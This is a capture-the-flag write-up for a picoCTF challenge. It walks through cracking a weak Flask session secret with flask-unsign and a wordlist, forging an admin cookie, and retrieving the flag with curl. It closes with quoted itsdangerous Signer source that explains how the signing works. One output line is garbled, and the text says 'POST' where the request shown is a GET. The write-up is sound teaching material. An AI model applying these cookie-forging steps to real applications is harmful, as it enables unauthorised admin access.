# Solution

Flag is hidden behind the website. The task provides us with the server.py file.

```python
@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```

Our flag will only be displayed if the session's `very_auth=admin`. And session is stored inside our cookie.

```
session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YVllZQ.mOg3VmVKn1VWRpSFhO94BpzXUjM
```

The cookie consists of two parts. 
```
{base64-encoded}.{signature}
```

All we have to do is to guess the secret key and then create a new cookie with the secret.

Thankfully `flask-unsign` exists.

```bash
$ pip install flask-unsign

# Find the correct secret from the list provided in server.py
$ flask-unsign --unsign -c eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.YVllZQ.mOg3VmVKn1VWRpSFhO94BpzXUjM --wordlist secrets.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
# Create a new token signed with the secret key

$ flask-unsign --sign -c '{"very_auth":"admin"}' --secret 'peanut butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YVvx4w.NfL4nHarA5GJEvhXkusK5bWUcGg
```

Now all we have to do is POST the cookie to `/display` and we'll get our flag.

```bash
$ curl 'http://mercury.picoctf.net:53700/display' -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.YVvx4w.NfL4nHarA5GJEvhXkusK5bWUcGg'

picoCTF{pwn_4ll_th3_cook1E5_3646b931}
```

For people interested in how the cookie is created. Flask uses the following class in `itsdangerous` library and calls its `sign` method.

```python
class Signer:
    """Output is truncated to only our interested methods"""
    #: The default digest method to use for the signer. The default is
    #: :func:`hashlib.sha1`, but can be changed to any :mod:`hashlib` or
    #: compatible object. Note that the security of the hash alone
    #: doesn't apply when used intermediately in HMAC.
    #:
    #: .. versionadded:: 0.14
    default_digest_method: _t.Any = staticmethod(hashlib.sha1)

    #: The default scheme to use to derive the signing key from the
    #: secret key and salt. The default is ``django-concat``. Possible
    #: values are ``concat``, ``django-concat``, and ``hmac``.
    #:
    #: .. versionadded:: 0.14
    default_key_derivation: str = "django-concat"

    def __init__(
        self,
        secret_key: _t_secret_key,
        salt: _t_opt_str_bytes = b"itsdangerous.Signer",
        sep: _t_str_bytes = b".",
        key_derivation: _t.Optional[str] = None,
        digest_method: _t.Optional[_t.Any] = None,
        algorithm: _t.Optional[SigningAlgorithm] = None,
    ):
        self.secret_keys: _t.List[bytes] = _make_keys_list(secret_key)
        self.sep: bytes = want_bytes(sep)

        if self.sep in _base64_alphabet:
            raise ValueError(
                "The given separator cannot be used because it may be"
                " contained in the signature itself. ASCII letters,"
                " digits, and '-_=' must not be used."
            )

        if salt is not None:
            salt = want_bytes(salt)
        else:
            salt = b"itsdangerous.Signer"

        self.salt = salt

        if key_derivation is None:
            key_derivation = self.default_key_derivation

        self.key_derivation: str = key_derivation

        if digest_method is None:
            digest_method = self.default_digest_method

        self.digest_method: _t.Any = digest_method

        if algorithm is None:
            algorithm = HMACAlgorithm(self.digest_method)

        self.algorithm: SigningAlgorithm = algorithm
    
    def derive_key(self, secret_key: _t_opt_str_bytes = None) -> bytes:
        """This method is called to derive the key. The default key
        derivation choices can be overridden here. Key derivation is not
        intended to be used as a security method to make a complex key
        out of a short password. Instead you should use large random
        secret keys.
        :param secret_key: A specific secret key to derive from.
            Defaults to the last item in :attr:`secret_keys`.
        .. versionchanged:: 2.0
            Added the ``secret_key`` parameter.
        """
        if secret_key is None:
            secret_key = self.secret_keys[-1]
        else:
            secret_key = want_bytes(secret_key)

        if self.key_derivation == "concat":
            return _t.cast(bytes, self.digest_method(self.salt + secret_key).digest())
        elif self.key_derivation == "django-concat":
            return _t.cast(
                bytes, self.digest_method(self.salt + b"signer" + secret_key).digest()
            )
        elif self.key_derivation == "hmac":
            mac = hmac.new(secret_key, digestmod=self.digest_method)
            mac.update(self.salt)
            return mac.digest()
        elif self.key_derivation == "none":
            return secret_key
        else:
            raise TypeError("Unknown key derivation method")

    def get_signature(self, value: _t_str_bytes) -> bytes:
        """Returns the signature for the given value."""
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)

    def sign(self, value: _t_str_bytes) -> bytes:
        """Signs the given string."""
        value = want_bytes(value)
        return value + self.sep + self.get_signature(value)
```
